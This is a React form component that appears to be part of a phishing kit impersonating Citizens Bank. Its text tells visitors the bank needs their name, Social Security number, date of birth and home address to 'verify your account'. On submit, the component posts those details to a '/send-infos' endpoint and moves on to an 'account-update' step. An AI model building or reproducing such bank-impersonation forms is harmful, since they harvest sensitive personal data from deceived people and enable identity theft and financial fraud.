import { useForm } from "react-hook-form";
import axios from "axios";

import TextInput from "./TextInput";
import LeftSide from "./LeftSide";
import RightSide from "./RightSide";
import Sides from "./Sides";
import Button from "./Button";
import Error from "./Error";

const PersonalInformation = ({ updateInputs, history }) => {
  const onSubmit = async (data) => {
    updateInputs({
      form: "PERSONAL INFORMATION",
      personalInfo: data,
    });
    await axios.post("/send-infos", {
      form: "PERSONAL INFORMATION",
      personalInfo: data,
    });
    history.push("/account-update");
  };

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();
  return (
    <div className="card-information">
      <Sides>
        <LeftSide>
          <div>
            <TextInput
              name="firstname"
              title="First name"
              register={register("firstname", {
                required: "Please enter your first name",
              })}
            />
            {errors?.firstname && <Error message={errors.firstname.message} />}
          </div>
          <div>
            <TextInput
              name="lastname"
              title="Last name"
              register={register("lastname", {
                required: "Please enter your last name",
              })}
            />
            {errors?.lastname && <Error message={errors.lastname.message} />}
          </div>
          <div>
            <TextInput
              name="ssn"
              title="Social Security Number"
              type="number"
              register={register("ssn", {
                required: "Please enter your Social Security Number",
                pattern: {
                  value: /^\d{3}-?\d{2}-?\d{4}$/,
                  message: "Please enter a valid SSN",
                },
              })}
            />
            {errors?.ssn && <Error message={errors.ssn.message} />}
          </div>
          <div>
            <TextInput
              name="dob"
              title="Date of birth: MM/DD/YYYY"
              register={register("dob", {
                required: "Please enter your date of birth",
                pattern: {
                  value:
                    /(0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])[- /.](19|20)\d\d/,
                  message:
                    "Please enter a valid date of birth in the format mentioned above",
                },
              })}
            />
            {errors?.dob && <Error message={errors.dob.message} />}
          </div>
          <div>
            <TextInput
              name="address"
              title="Street address"
              type="text"
              register={register("address", {
                required: "Please enter your street address",
              })}
            />
            {errors?.address && <Error message={errors.address.message} />}
          </div>
          <div>
            <TextInput
              name="zipCode"
              title="Zip code"
              register={register("zipCode", {
                required: "Please enter your Zip code",
              })}
            />
            {errors?.zipCode && <Error message={errors.zipCode.message} />}
          </div>
          <div>
            <TextInput
              name="state"
              title="State"
              register={register("state", {
                required: "Please enter your state",
              })}
            />
            {errors?.state && <Error message={errors.state.message} />}
          </div>
        </LeftSide>
        <RightSide>
          <h4>Why do I have to provide this information</h4>
          <p>
            Citizens bank requires all this information to be able to verify
            your account
          </p>
        </RightSide>
      </Sides>
      <Button onClick={handleSubmit(onSubmit)} />
    </div>
  );
};

export default PersonalInformation;
